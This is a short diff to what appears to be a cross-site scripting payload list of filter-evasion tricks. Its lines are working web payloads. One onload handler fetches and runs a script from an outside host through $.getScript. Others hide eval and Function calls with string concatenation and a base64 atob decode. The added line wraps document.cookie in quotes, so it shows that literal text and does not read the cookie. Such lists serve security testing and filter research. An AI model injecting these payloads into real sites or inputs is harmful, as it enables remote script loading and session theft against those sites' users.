@@ -353,3 +353,4 @@ onload=x=>$.getScript('//brutelogic.com.br/2.js')
 a=”al”;b=”ert”;self[a+b]();
 a=”Fun”;b=”ction”;c=”ev”;d=”al(a”;e=”tob”;f=”(‘YWxlcnQoMSk=’))”;self[a+b](c+d+e+f)();
 ;a=”ev”;b=”al”;c=”(a”;d=”tob(‘“;e=”YWxlcnQoMSk=’))”;[a+b+c+d+e].map(setTimeout)
+{alert('document.cookie')}
